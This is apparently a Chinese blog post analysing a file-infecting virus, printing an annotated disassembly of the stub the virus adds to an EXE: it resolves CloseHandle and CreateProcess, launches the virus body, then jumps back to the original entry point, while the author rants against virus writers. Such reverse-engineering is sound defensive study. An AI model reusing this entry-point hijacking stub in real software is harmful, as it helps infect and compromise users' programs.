
# 病毒堆栈分析

看堆栈！！！死病毒，改了`EXE`文件多少字节内容啊！！！

`![](img/7eab1bc9545ab1e77b68fc01506c52ecc.jpg "狂怒")`  
`![](img/38e7ba9545ab1e77b68fc01506c52ecc.jpg)`

```
0041312C   .  56            push    esi  

0041312D   .  8D35 D5114000 lea     esi, dword ptr [4011D5]  

00413133   .  8BC6          mov     eax, esi  

00413135   .  5E            pop     esi  

00413136   .  03C3          add     eax, ebx  

00413138   .  50            push    eax  

00413139   .  8B93 ED114000 mov     edx, dword ptr [ebx+4011ED]  

0041313F   .  52            push    edx  

00413140   .  FFD7          call    edi                         ;  通过 GetProcAddress 得到 CloseHandle 函数地址  

00413142   .  56            push    esi  

00413143   .  FFD0          call    eax                         ;  CloseHandle 文件句柄  

00413145   .  8D83 AE114000 lea     eax, dword ptr [ebx+4011AE]  

0041314B   .  50            push    eax  

0041314C   .  8B93 ED114000 mov     edx, dword ptr [ebx+4011ED]  

00413152   .  52            push    edx  

00413153   .  FFD7          call    edi                         ;  得到 CreateProcess 函数地址  

00413155   .  83EC 44       sub     esp, 44  

00413158   .  8BD4          mov     edx, esp  

0041315A   .  BE 00000000   mov     esi, 0  

0041315F   .  B9 11000000   mov     ecx, 11  

00413164   >  8932          mov     dword ptr [edx], esi  

00413166   .  83C2 04       add     edx, 4  

00413169   .^ E2 F9         loopd   short 00413164  

0041316B   .  BA 44000000   mov     edx, 44  

00413170   .  891424        mov     dword ptr [esp], edx  

00413173   .  83EC 10       sub     esp, 10  

00413176   .  8BD4          mov     edx, esp  

00413178   .  54            push    esp  

00413179   .  83C2 10       add     edx, 10  

0041317C   .  52            push    edx  

0041317D   .  33C9          xor     ecx, ecx  

0041317F   .  51            push    ecx  

00413180   .  51            push    ecx  

00413181   .  51            push    ecx  

00413182   .  51            push    ecx  

00413183   .  51            push    ecx  

00413184   .  51            push    ecx  

00413185   .  51            push    ecx  

00413186   .  83C2 44       add     edx, 44  

00413189   .  52            push    edx  

0041318A   .  FFD0          call    eax                         ;  通过 CreateProcess 调用病毒体  

0041318C   .  8BE5          mov     esp, ebp  

0041318E   .- E9 D901FFFF   jmp     0040336C                    ;  跳回原 EXE 的 OEP 处  
```

继续执行，在这之后`DUMP`亦可。

再下面是病毒用到的字串及函数名定义：

`![](img/dfdf2f86d813b0904a82998cd020d502.jpg)`

最后，再次劳骚一句，写啥不行啊，偏要写病毒！不能做点对社会有用的事情么？？？`![](img/7eab1bc95cbb1be9f15eb01bf012328f.jpg "狂怒")`
